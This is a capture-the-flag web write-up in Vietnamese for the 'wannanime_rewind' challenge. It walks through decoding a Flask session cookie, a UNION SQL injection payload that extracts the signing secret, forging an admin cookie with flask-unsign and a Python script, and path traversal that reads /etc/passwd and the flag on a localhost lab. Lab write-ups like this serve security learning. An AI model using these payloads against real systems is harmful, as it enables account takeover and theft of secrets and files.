---
title: wannanime_rewind
date: 2026-10-05
ctf: aochinh26
category: web
difficulty: medium
tags:
  - Flask Session
  - flask-unsign
  - SQL Injection
  - UNION
  - Path Traversal
---

# Đề bài
File: [wannanime_rewind.zip](https://github.com/Drakie14/Challenges/blob/aochinh26/wannanime_rewind.zip)
# Solution 
## Hình thành hướng đi từ session cookie
Đến với bài này thì source code bên `app.py` đã có thay đổi so với bài [wannanime](https://drakie14-ctf-wu.pages.dev/posts/wannanime/). Tuy vậy áp dụng hoàn toàn payload cũ vẫn tìm được flag.

Nhưng như vậy thì không hay lắm, ta tìm cách làm khác.

Cũng bắt đầu với việc đăng kí 1 tài khoản, đăng nhập rồi quan sát cookie. 
Ở đây tôi tạo `username:1`,`password:1` rồi quan sát cookie sau khi đăng nhập vào account vừa tạo, thấy cookie có dạng như sau:
```
eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiMSJ9.asL_Qg.GsnKGuT-fojHmh6BH0d_Th8CQ6Y
```
Có thể tách biệt thành 3 phần với 2 dấu `.`

| Phần | Encoded data | Mục đích |
| ---- | ------------ | -------- |
|  1   | eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiMSJ9  | 	Base64 encoded JSON     |
|  2   | asL_Qg   |  Timestamp  |
|  3   | GsnKGuT-fojHmh6BH0d_Th8CQ6Y |  Hash-based Message Authentication Code (HMAC)  |

Đây chính là [Flask session cookie](https://www.bordergate.co.uk/flask-session-cookies/)
-> Thử decode đoạn Base64 encoded JSON thu được:
```js{"role":"admin","user":"admin"}on!
{"role":"user","username":"1"}
```
Tôi suy nghĩ ngay đến việc tái tạo lại session cookie của `admin` bằng command
```bash
flask-unsign --sign --cookie "{'role': 'admin', 'username': 'admin'}" --secret '(private_key)'
```

![image](https://hackmd.io/_uploads/S1YXNtesGe.png)

Muốn làm được vậy thì cần có `private_key` của flask để kí data mà ta muốn truyền vào 

## Tìm kiếm `private_key` từ SQL Injection

Ở `app.py` có dòng code sau:
```python
cursor.execute("SELECT value FROM settings WHERE name=%s", ('flask_secret_key',))
```
Vậy ta biết `private_key` được giữ `value` của `settings`
```sql!
CREATE TABLE IF NOT EXISTS settings (
    name VARCHAR(100) PRIMARY KEY,
    value VARCHAR(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
```
-> Payload: 
```sql!
UNION SELECT name, value, NULL, NULL, NULL FROM settings -- \
```
để lấy về giá trị của `value`
![image](https://hackmd.io/_uploads/SyPeScesGl.png)

-> `078185b423f8fd5a1b8f0bd78576c14389b55cda024322da499a6ca7cc00cfd6`

Giờ ta đã có `private_key`, điều còn lại cần làm đơn giản là kí data giả và lấy về flag thôi

## Kí Flask session cookie
Có thể dùng command ở trên để kí, code python hoặc dùng tool trên internet.
1. command
![image](https://hackmd.io/_uploads/BJTuB9esGg.png)
-> Session cookie: 
```
eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.asMVXw.2Q_qJNCy277nAxAmqxtk1Faeak4
```
2.  code python
```python
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
import hashlib

secret_key = "078185b423f8fd5a1b8f0bd78576c14389b55cda024322da499a6ca7cc00cfd6"

serializer = URLSafeTimedSerializer(
    secret_key,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)

data = {"role": "admin", "username": "admin"}
forged_cookie = serializer.dumps(data)
print(forged_cookie)
```
3. online tool ([Key Decryptor](https://keydecryptor.com/decryption-tools/flask-cookie))
![image](https://hackmd.io/_uploads/rJri8cxofl.png)
-> Session cookie: 
```
eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.asMWjA.gKYa-edG7_wGbmHNP1pWguui01c
```

> 2 Session cookie khác nhau vì được kí tại thời điểm khác nhau -> Timestamp khác nhau

## Thay session và làm tương tự  [wannanime](https://drakie14-ctf-wu.pages.dev/posts/wannanime/)

Truy cập URL `http://localhost:5000/admin?filename=/etc/passwd` thu được
![image](https://hackmd.io/_uploads/Hy-sD9lifx.png)

-> Truy cập URL:
```
http://localhost:5000/admin?filename=/this_is_fake_directory_in_prod_this_is_random/flag.txt
```

-> Flag:
`flag{fake_flag}`
